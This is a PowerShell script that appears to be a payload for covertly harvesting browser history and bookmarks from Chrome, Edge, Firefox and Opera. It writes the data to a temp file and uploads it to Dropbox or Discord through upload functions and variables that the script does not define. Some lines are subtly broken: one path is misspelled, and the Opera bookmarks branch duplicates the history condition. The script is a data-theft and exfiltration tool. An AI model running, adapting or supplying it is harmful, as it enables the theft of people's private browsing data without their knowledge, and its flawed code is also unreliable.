function Get-BrowserData {

    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,    
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE\AppData\Local\Microsof/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\History"}
    elseif ($Browser -eq 'opera'   -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Opera Software\Opera GX Stable\Bookmarks"}

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

$LogFilePath = "$env:USERPROFILE\Desktop\BrowserData_Log.txt"

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Starting data collection." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Edge history collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Edge bookmarks collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Chrome history collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Chrome bookmarks collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Firefox history collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "opera" -DataType "history" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Opera history collected." | Out-File -FilePath $LogFilePath -Append

Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TEMP\--BrowserData.txt
"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Data for Opera bookmarks collected." | Out-File -FilePath $LogFilePath -Append

# Upload output file to Dropbox (if $db variable is not empty)
if (-not ([string]::IsNullOrEmpty($db))) {
    "Uploading data to Dropbox." | Out-File -FilePath $LogFilePath -Append
    DropBox-Upload -SourceFilePath "$env:TEMP\--BrowserData.txt"
}

# Upload to Discord (if $dc variable is not empty)
if (-not ([string]::IsNullOrEmpty($dc))) {
    "Uploading data to Discord." | Out-File -FilePath $LogFilePath -Append
    Upload-Discord -file "$env:TEMP\--BrowserData.txt"
}

"$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - Script execution completed." | Out-File -FilePath $LogFilePath -Append
